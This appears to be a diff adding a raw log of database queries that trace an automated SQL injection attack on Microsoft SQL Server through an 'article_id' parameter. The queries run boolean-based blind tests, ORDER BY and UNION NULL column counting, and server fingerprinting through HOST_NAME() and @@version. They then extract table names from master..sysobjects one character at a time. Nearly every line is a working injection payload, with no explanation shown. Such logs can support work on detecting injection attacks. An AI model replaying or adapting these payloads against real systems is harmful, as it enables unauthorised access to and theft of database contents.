@@ -1,0 +1,3570 @@
+use [master]	86
+	165
+	66
+SELECT * FROM articles where article_id = 100	119
+	200
+	66
+use [master]	86
+	165
+	66
+SELECT * FROM articles where article_id = 100	119
+	200
+	66
+use [master]	86
+	165
+	66
+SELECT * FROM articles where article_id = 100	119
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100)(.(,")'(,	129
+	221
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100'OyMAqH<'">suPZlF	136
+	230
+	66
+use [master]	86
+	165
+	66
+SELECT * FROM articles where article_id = 100) AND 9221=5201 AND (8255=8255	149
+	136
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100) AND 3201=3201 AND (9929=9929	149
+	136
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 9177=6322	133
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 3201=3201	133
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 3841=2272	133
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 4525 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (4525=4525) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113)))	306
+	248
+use [master]	86
+	165
+SELECT * FROM articles where article_id = (SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (5596=5596) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113))	288
+	248
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 ORDER BY 1-- TJOh	137
+	204
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 ORDER BY 2113-- EFKw	140
+	202
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 ORDER BY 10-- EcFD	138
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 ORDER BY 6-- rwpA	137
+	199
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 ORDER BY 4-- PjUr	137
+	199
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 ORDER BY 3-- jcvL	137
+	199
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 ORDER BY 2-- AmsV	137
+	221
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(116)+CHAR(65)+CHAR(77)+CHAR(97)+CHAR(118)+CHAR(109)+CHAR(71)+CHAR(74)+CHAR(71)+CHAR(85)+CHAR(113)+CHAR(102)+CHAR(105)+CHAR(102)+CHAR(76)+CHAR(110)+CHAR(99)+CHAR(104)+CHAR(121)+CHAR(106)+CHAR(69)+CHAR(108)+CHAR(80)+CHAR(81)+CHAR(70)+CHAR(83)+CHAR(105)+CHAR(85)+CHAR(83)+CHAR(70)+CHAR(102)+CHAR(75)+CHAR(102)+CHAR(119)+CHAR(101)+CHAR(78)+CHAR(81)+CHAR(84)+CHAR(99)+CHAR(105)+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113)-- kZle	628
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(105)+CHAR(65)+CHAR(82)+CHAR(72)+CHAR(118)+CHAR(85)+CHAR(84)+CHAR(84)+CHAR(103)+CHAR(109)+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113)-- TBgS	336
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = -3109 UNION ALL SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(105)+CHAR(108)+CHAR(82)+CHAR(111)+CHAR(118)+CHAR(86)+CHAR(102)+CHAR(118)+CHAR(80)+CHAR(81)+CHAR(65)+CHAR(121)+CHAR(111)+CHAR(110)+CHAR(109)+CHAR(110)+CHAR(72)+CHAR(119)+CHAR(102)+CHAR(76)+CHAR(114)+CHAR(118)+CHAR(69)+CHAR(111)+CHAR(81)+CHAR(70)+CHAR(76)+CHAR(104)+CHAR(70)+CHAR(100)+CHAR(106)+CHAR(74)+CHAR(99)+CHAR(65)+CHAR(83)+CHAR(73)+CHAR(116)+CHAR(112)+CHAR(113)+CHAR(73)+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113)-- RhXe	634
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = -2418 UNION ALL SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(71)+CHAR(117)+CHAR(121)+CHAR(90)+CHAR(100)+CHAR(117)+CHAR(84)+CHAR(112)+CHAR(106)+CHAR(88)+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(122)+CHAR(113)-- gQoW	340
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL-- POpe	148
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL-- MSuB	153
+	195
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL-- pYZf	158
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL-- pXwZ	163
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ZbnI	168
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- mKdb	173
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vmFo	178
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GpWE	183
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dahw	188
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wLzM	193
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JGaL	198
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UAvE	203
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ECQS	208
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ftIx	213
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hiil	218
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wYkM	223
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ytsI	228
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ONrg	233
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XbDz	238
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cvCv	243
+	238
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 39=39	129
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 39=86	129
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 86=77	129
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 77=77	129
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 86 77	129
+	137
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 9386=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9386	653
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND (7683)=7683	135
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND 7684>7683	133
+	200
+	66
+use [master]	86
+	165
+	66
+SELECT * FROM articles where article_id = 100 AND UNICODE(SQUARE(NULL)) IS NULL	153
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND HOST_NAME()=HOST_NAME()	147
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND XACT_STATE()=XACT_STATE()	149
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND SYSDATETIME()=SYSDATETIME()	151
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND CONCAT(NULL,NULL)=CONCAT(NULL,NULL)	159
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND CHARINDEX(CHAR(49)+CHAR(50)+CHAR(46)+CHAR(48)+CHAR(46)+CHAR(50)+CHAR(48)+CHAR(48)+CHAR(48),@@version)>0	227
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND ISJSON(NULL) IS NULL	144
+	200
+	66
+use [master]	86
+	165
+	66
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85)),1,1))>51	259
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85)),1,1))>54	259
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85)),1,1))>56	259
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85)),1,1))>57	259
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85)),2,1))>51	259
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85)),2,1))>48	259
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(COUNT(name) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85)),2,1))>9	258
+	138
+	66
+use [master]	86
+	165
+	66
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>64	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>104	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>100	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>98	451
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>97	451
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>112	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>120	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>116	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>114	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>113	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>112	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>120	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>116	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>114	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>115	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>104	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>108	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>106	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>105	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>104	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>100	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>98	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>99	451
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>104	452
+	200
+use [master]	86
+	165
